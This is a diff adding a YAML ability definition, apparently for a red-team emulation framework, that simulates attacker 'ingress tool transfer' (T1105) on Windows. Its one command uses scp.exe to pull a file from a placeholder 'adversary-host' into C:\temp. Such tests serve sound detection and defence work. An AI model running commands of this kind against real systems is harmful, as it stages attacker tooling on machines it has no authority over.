@@ -1,0 +1,19 @@
+---
+- id: 43713802a7a8bd2560a3c90648ffcc12
+  name: Windows pull file using scp.exe
+  description: 'This test simulates pulling files using SCP on a Windows environment.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: scp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
